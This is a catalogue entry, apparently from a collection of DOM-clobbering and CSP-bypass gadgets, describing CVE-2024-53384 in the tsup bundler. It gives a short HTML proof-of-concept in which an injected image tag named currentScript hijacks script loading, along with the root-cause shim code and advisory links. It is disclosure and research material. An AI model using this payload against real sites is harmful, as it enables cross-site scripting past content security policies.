---
description: The simplest and fastest way to bundle your TypeScript libraries.
github: egoist/tsup
gadgets:
  ≤8.3.4:
    cve: CVE-2024-53384
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: Tsup was translating the `import.meta.url` to `document.currentScript` in `cjs_shims.js` to determine the URL of the current script.<br><br>*In the CVE advisory, it mentions version `≤8.3.4`, but it looks to work in the latest version (`8.5.0`).*
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="[current-location]/assets/libs/tsup/index.js?"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/egoist/tsup/blob/92ee84251f7c5dad7691f6052eb8b767899e0cff/assets/cjs_shims.js#L6">https://github.com/egoist/tsup/blob/92ee84251f7c5dad7691f6052eb8b767899e0cff/assets/cjs_shims.js#L6</a>

      ```javascript
      const getImportMetaUrl = () =>
        typeof document === 'undefined'
          ? new URL(`file:${__filename}`).href
          : (document.currentScript && document.currentScript.src) ||
            new URL('main.js', document.baseURI).href

      export const importMetaUrl = /* @__PURE__ */ getImportMetaUrl()
      ```
    links:
      - https://github.com/advisories/GHSA-3mv9-4h5g-vhg3
      - https://gist.github.com/jackfromeast/36f98bf7542d11835c883c1d175d9b92
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/tsup.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
